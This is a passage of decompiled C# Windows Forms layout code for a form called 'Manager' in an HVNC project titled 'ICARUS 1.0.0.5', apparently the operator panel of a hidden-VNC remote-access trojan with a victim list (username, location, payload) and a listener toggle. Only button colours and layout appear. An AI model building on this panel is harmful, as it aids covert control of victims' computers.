			bloom35.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom36.Name = "Corners";
			bloom36.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton5.Colors = new BloomBrain[13]
			{
				bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31, bloom32, bloom33,
				bloom34, bloom35, bloom36
			};
			this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton5.Image = null;
			this.studioButton5.Location = new System.Drawing.Point(1347, -5);
			this.studioButton5.Name = "studioButton5";
			this.studioButton5.NoRounding = false;
			this.studioButton5.Size = new System.Drawing.Size(13, 30);
			this.studioButton5.TabIndex = 24;
			this.studioButton5.Transparent = true;
			this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
			this.ClientsList.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.ClientsList.BackColor = System.Drawing.Color.FromArgb(226, 226, 226);
			this.ClientsList.BackgroundImage = HVNC.Properties.Resources.finalRecovered;
			this.ClientsList.BorderStyle = System.Windows.Forms.BorderStyle.None;
			this.ClientsList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[7] { this.columnHeader1, this.columnHeader2, this.columnHeader3, this.columnHeader4, this.columnHeader5, this.columnHeader6, this.columnHeader7 });
			this.ClientsList.Font = new System.Drawing.Font("Century Gothic", 8f);
			this.ClientsList.FullRowSelect = true;
			this.ClientsList.HideSelection = false;
			this.ClientsList.Location = new System.Drawing.Point(14, 41);
			this.ClientsList.Name = "ClientsList";
			this.ClientsList.OwnerDraw = true;
			this.ClientsList.Size = new System.Drawing.Size(1346, 590);
			this.ClientsList.SmallImageList = this.imageList1;
			this.ClientsList.TabIndex = 1;
			this.ClientsList.UseCompatibleStateImageBehavior = false;
			this.ClientsList.View = System.Windows.Forms.View.Details;
			this.ClientsList.DoubleClick += new System.EventHandler(HVNCList_DoubleClick);
			this.ClientsList.MouseDown += new System.Windows.Forms.MouseEventHandler(HVNCList_MouseDown);
			this.ClientsList.MouseLeave += new System.EventHandler(HVNCList_MouseLeave);
			this.columnHeader1.Text = "GROUP";
			this.columnHeader1.Width = 135;
			this.columnHeader2.Text = "ROOT";
			this.columnHeader2.Width = 141;
			this.columnHeader3.Text = "USERNAME";
			this.columnHeader3.Width = 176;
			this.columnHeader4.Text = "LOCATION";
			this.columnHeader4.Width = 100;
			this.columnHeader5.Text = "SYSTEM";
			this.columnHeader5.Width = 198;
			this.columnHeader6.Text = "ACTIVATED";
			this.columnHeader6.Width = 153;
			this.columnHeader7.Text = "PAYLOAD";
			this.columnHeader7.Width = 91;
			this.studioButton4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton4.BackColor = System.Drawing.Color.Transparent;
			bloom37.Name = "DownGradient1";
			bloom37.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom38.Name = "DownGradient2";
			bloom38.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom39.Name = "NoneGradient1";
			bloom39.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom40.Name = "NoneGradient2";
			bloom40.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom41.Name = "Shine1";
			bloom41.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom42.Name = "Shine2A";
			bloom42.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom43.Name = "Shine2B";
			bloom43.Value = System.Drawing.Color.Transparent;
			bloom44.Name = "Shine3";
			bloom44.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom45.Name = "TextShade";
			bloom45.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom46.Name = "Text";
			bloom46.Value = System.Drawing.Color.White;
			bloom47.Name = "Glow";
			bloom47.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom48.Name = "Border";
			bloom48.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom49.Name = "Corners";
			bloom49.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton4.Colors = new BloomBrain[13]
			{
				bloom37, bloom38, bloom39, bloom40, bloom41, bloom42, bloom43, bloom44, bloom45, bloom46,
				bloom47, bloom48, bloom49
			};
			this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton4.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton4.Image = null;
			this.studioButton4.Location = new System.Drawing.Point(1328, -5);
			this.studioButton4.Name = "studioButton4";
			this.studioButton4.NoRounding = false;
			this.studioButton4.Size = new System.Drawing.Size(13, 30);
			this.studioButton4.TabIndex = 23;
			this.studioButton4.Transparent = true;
			this.studioButton4.Click += new System.EventHandler(studioButton4_Click);
			this.studioButton3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			this.studioButton3.BackColor = System.Drawing.Color.Transparent;
			bloom50.Name = "DownGradient1";
			bloom50.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom51.Name = "DownGradient2";
			bloom51.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom52.Name = "NoneGradient1";
			bloom52.Value = System.Drawing.Color.FromArgb(65, 85, 115);
			bloom53.Name = "NoneGradient2";
			bloom53.Value = System.Drawing.Color.FromArgb(45, 65, 95);
			bloom54.Name = "Shine1";
			bloom54.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom55.Name = "Shine2A";
			bloom55.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
			bloom56.Name = "Shine2B";
			bloom56.Value = System.Drawing.Color.Transparent;
			bloom57.Name = "Shine3";
			bloom57.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
			bloom58.Name = "TextShade";
			bloom58.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
			bloom59.Name = "Text";
			bloom59.Value = System.Drawing.Color.White;
			bloom60.Name = "Glow";
			bloom60.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
			bloom61.Name = "Border";
			bloom61.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			bloom62.Name = "Corners";
			bloom62.Value = System.Drawing.Color.FromArgb(20, 40, 70);
			this.studioButton3.Colors = new BloomBrain[13]
			{
				bloom50, bloom51, bloom52, bloom53, bloom54, bloom55, bloom56, bloom57, bloom58, bloom59,
				bloom60, bloom61, bloom62
			};
			this.studioButton3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
			this.studioButton3.Font = new System.Drawing.Font("Verdana", 8f);
			this.studioButton3.Image = null;
			this.studioButton3.Location = new System.Drawing.Point(1309, -5);
			this.studioButton3.Name = "studioButton3";
			this.studioButton3.NoRounding = false;
			this.studioButton3.Size = new System.Drawing.Size(13, 30);
			this.studioButton3.TabIndex = 22;
			this.studioButton3.Transparent = true;
			this.studioButton3.Click += new System.EventHandler(studioButton3_Click);
			this.panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			this.panel1.BackColor = System.Drawing.Color.White;
			this.panel1.Controls.Add(this.chkListen);
			this.panel1.Controls.Add(this.label1);
			this.panel1.Controls.Add(this.label_0);
			this.panel1.Location = new System.Drawing.Point(14, 32);
			this.panel1.Name = "panel1";
			this.panel1.Size = new System.Drawing.Size(1346, 626);
			this.panel1.TabIndex = 39;
			this.chkListen.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.chkListen.BackColor = System.Drawing.Color.Transparent;
			this.chkListen.Location = new System.Drawing.Point(9, 603);
			this.chkListen.Name = "chkListen";
			this.chkListen.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkListen.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.chkListen.Size = new System.Drawing.Size(50, 19);
			this.chkListen.Style = JCS.ToggleSwitch.ToggleSwitchStyle.BrushedMetal;
			this.chkListen.TabIndex = 40;
			this.chkListen.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkListen_CheckedChanged);
			this.label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label1.AutoSize = true;
			this.label1.Location = new System.Drawing.Point(86, 602);
			this.label1.Name = "label1";
			this.label1.Size = new System.Drawing.Size(71, 16);
			this.label1.TabIndex = 27;
			this.label1.Text = "Listener :";
			this.label_0.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			this.label_0.AutoSize = true;
			this.label_0.ForeColor = System.Drawing.Color.SteelBlue;
			this.label_0.Location = new System.Drawing.Point(156, 602);
			this.label_0.Name = "HVNCListen";
			this.label_0.Size = new System.Drawing.Size(62, 16);
			this.label_0.TabIndex = 26;
			this.label_0.Text = "Disabled";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(1374, 671);
			this.ContextMenuStrip = this.contextMenuStrip1;
			base.Controls.Add(this.primeTheme1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "Manager";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "{ ICARUS 1.0.0.5 } - Connections: 0";
			base.TransparencyKey = System.Drawing.Color.Fuchsia;
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(Form1_FormClosing);
			base.Load += new System.EventHandler(FrmMain_Load);
			this.contextMenuStrip1.ResumeLayout(false);
			this.primeTheme1.ResumeLayout(false);
			this.primeTheme1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			base.ResumeLayout(false);
		}

		static Manager()
		{
			Manager.random = new Random();
		}
	}
}
